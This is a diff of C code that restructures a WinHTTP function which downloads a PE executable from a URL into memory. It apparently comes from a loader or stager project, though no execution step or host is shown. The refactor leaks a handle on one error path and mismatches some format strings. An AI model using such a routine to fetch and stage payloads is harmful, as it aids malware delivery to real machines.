@@ -108,102 +108,118 @@ BOOL Download(LPCWSTR url, LPCWSTR file, PCONTENT cnt) {
 		0
 	);
 
-	if (hSession) {
-		// Connect to URL
-		HINTERNET hConnect = WinHttpConnect(
-			hSession,
-			url,
-			port,
-			0
-		);
+	if (!hSession) {
+		DEBUG_PRINT("[!] Could not open HTTP Session\n");
+		return FALSE;
 
-		if (hConnect) {
-			//Create a http request
-			HINTERNET hRequest = WinHttpOpenRequest(
-				hConnect,
-				L"GET",
-				file,
-				NULL,
-				WINHTTP_NO_REFERER,
-				WINHTTP_DEFAULT_ACCEPT_TYPES,
-				dwFlags
-			);
-#ifdef SECURE
-			//SSL
-			BOOL bRet = WinHttpSetOption(
-				hRequest,
-				WINHTTP_OPTION_SECURITY_FLAGS,
-				&secFlags,
-				sizeof(DWORD)
-			);
-#endif
-			// Send the request
-			if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
-				//Parse the response
-				if (WinHttpReceiveResponse(hRequest, NULL)) {
-					DWORD Size = 0;
-					DWORD Downloaded = 0;
-					DWORD TotalSize = 0;
-					LPSTR download_buffer = NULL;
-
-					do {
-						if (!WinHttpQueryDataAvailable(hRequest, &Size)) {
-							DEBUG_PRINT("[!] Error %d in WinHttpQueryDataAvailable.\n", GetLastError());
-						}
-
-						if (Size > 0) {
-							LPSTR temp_buffer = (LPSTR)malloc(Size);
-							if (!temp_buffer) {
-								DEBUG_PRINT("[!] Out of memory while downloading.\n");
-								Size = 0;
-								break;
-							}
-
-							if (WinHttpReadData(hRequest, (LPVOID)temp_buffer, Size, &Downloaded)) {
-								LPSTR new_buffer = (LPSTR)realloc(download_buffer, TotalSize + Downloaded);
-								if (!new_buffer) {
-									DEBUG_PRINT("[!] Out of memory while reallocating buffer.\n");
-									free(temp_buffer);
-									Size = 0;
-									break;
-								}
-
-								download_buffer = new_buffer;
-								mymemcpy(download_buffer + TotalSize, temp_buffer, Downloaded);
-								TotalSize += Downloaded;
-							}
-
-							free(temp_buffer);
-						}
-					} while (Size > 0);
-
-					if (TotalSize > 0) {
-						cnt->data = download_buffer;
-						cnt->size = TotalSize;
-
-						WinHttpCloseHandle(hRequest);
-						WinHttpCloseHandle(hConnect);
-						WinHttpCloseHandle(hSession);
-
-						DEBUG_PRINT("[*] Downloaded the PE with size: %d\n", TotalSize);
-						return TRUE;
-					}
-					else {
-						free(download_buffer);
-						DEBUG_PRINT("[!] Download failed!\n");
-						return FALSE;
-					}
-
-				}
-				WinHttpCloseHandle(hRequest);
-			}
-			WinHttpCloseHandle(hConnect);
-		}
-		WinHttpCloseHandle(hSession);
 	}
+
+	// Connect to URL
+	HINTERNET hConnect = WinHttpConnect(
+		hSession,
+		url,
+		port,
+		0
+	);
+
+	if (!hConnect) {
+		DEBUG_PRINT("[!] Could not connect to %s:%s\n", url, port);
+		WinHttpCloseHandle(hSession);
+		return FALSE;
+	}
+
+	//Create a http request
+	HINTERNET hRequest = WinHttpOpenRequest(
+		hConnect,
+		L"GET",
+		file,
+		NULL,
+		WINHTTP_NO_REFERER,
+		WINHTTP_DEFAULT_ACCEPT_TYPES,
+		dwFlags
+	);
+#ifdef SECURE
+	//SSL
+	BOOL bRet = WinHttpSetOption(
+		hRequest,
+		WINHTTP_OPTION_SECURITY_FLAGS,
+		&secFlags,
+		sizeof(DWORD)
+	);
+#endif
+	// Send the request
+	BOOL stat = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+	if (!stat) {
+		DEBUG_PRINT("[!] Could not send HTTP request\n");
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return FALSE;
+	}
+
+	//Parse the response
+	if (WinHttpReceiveResponse(hRequest, NULL)) {
+		DWORD Size = 0;
+		DWORD Downloaded = 0;
+		DWORD TotalSize = 0;
+		LPSTR download_buffer = NULL;
+
+		do {
+			if (!WinHttpQueryDataAvailable(hRequest, &Size)) {
+				DEBUG_PRINT("[!] Error %d in WinHttpQueryDataAvailable.\n", GetLastError());
+			}
+
+			if (Size > 0) {
+				LPSTR temp_buffer = (LPSTR)malloc(Size);
+				if (!temp_buffer) {
+					DEBUG_PRINT("[!] Out of memory while downloading.\n");
+					Size = 0;
+					break;
+				}
+
+				if (WinHttpReadData(hRequest, (LPVOID)temp_buffer, Size, &Downloaded)) {
+					LPSTR new_buffer = (LPSTR)realloc(download_buffer, TotalSize + Downloaded);
+					if (!new_buffer) {
+						DEBUG_PRINT("[!] Out of memory while reallocating buffer.\n");
+						free(temp_buffer);
+						Size = 0;
+						break;
+					}
+
+					download_buffer = new_buffer;
+					mymemcpy(download_buffer + TotalSize, temp_buffer, Downloaded);
+					TotalSize += Downloaded;
+				}
+
+				free(temp_buffer);
+			}
+		} while (Size > 0);
+
+		if (TotalSize > 0) {
+			cnt->data = download_buffer;
+			cnt->size = TotalSize;
+
+			WinHttpCloseHandle(hRequest);
+			WinHttpCloseHandle(hConnect);
+			WinHttpCloseHandle(hSession);
+
+			DEBUG_PRINT("[*] Downloaded the PE with size: %d\n", TotalSize);
+			return TRUE;
+		}
+		else {
+			free(download_buffer);
+			DEBUG_PRINT("[!] Download failed!\n");
+			return FALSE;
+		}
+
+	}
+	WinHttpCloseHandle(hRequest);
+	WinHttpCloseHandle(hConnect);
+	WinHttpCloseHandle(hSession);
+
 	DEBUG_PRINT("[!] Download failed!\n");
 	return FALSE;
 }
+
 #endif
 
 
